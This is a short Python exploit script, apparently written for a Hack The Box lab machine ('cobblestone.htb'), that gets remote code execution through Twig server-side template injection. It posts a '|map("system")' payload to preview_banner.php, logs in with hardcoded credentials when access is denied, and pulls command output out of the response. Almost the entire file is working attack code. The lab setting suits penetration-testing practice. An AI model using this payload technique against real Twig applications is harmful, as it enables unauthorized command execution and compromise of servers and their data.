#!/usr/bin/env python3
"""Twig SSTI RCE via preview_banner.php (admin session required)."""
import html
import random
import string
import sys
import requests
from pathlib import Path

TARGET = "10.129.122.97"
HOST = "cobblestone.htb"
ART = Path(__file__).resolve().parent.parent / "artifacts"
CREDS = ("pwner37", "Pwner123!")


def load_session():
    p = ART / "admin_session.txt"
    if p.exists():
        return p.read_text().strip()
    return None


def rce(cmd, sess=None):
    s = requests.Session()
    s.headers["Host"] = HOST
    phpsessid = sess or load_session()
    if phpsessid:
        s.cookies.set("PHPSESSID", phpsessid, domain=HOST)

    marker = "".join(random.choices(string.ascii_letters, k=20))
    payload = marker + '{{ ["' + cmd.replace('"', '\\"') + '"]|map("system")|join }}' + marker
    resp = s.post(f"http://{TARGET}/preview_banner.php", data={"first": payload})
    if resp.status_code == 403 or "Access denied" in resp.text:
        data = {"username": CREDS[0], "password": CREDS[1]}
        s.post(f"http://{TARGET}/login_verify.php", data=data)
        resp = s.post(f"http://{TARGET}/preview_banner.php", data={"first": payload})

    resp.raise_for_status()
    parts = resp.text.split(marker)
    if len(parts) < 2:
        raise RuntimeError(f"marker not found in response (status={resp.status_code})")
    res = parts[1]
    lines = html.unescape("\n".join(res.splitlines()[:-1]))
    return lines


if __name__ == "__main__":
    print(rce(sys.argv[1]))
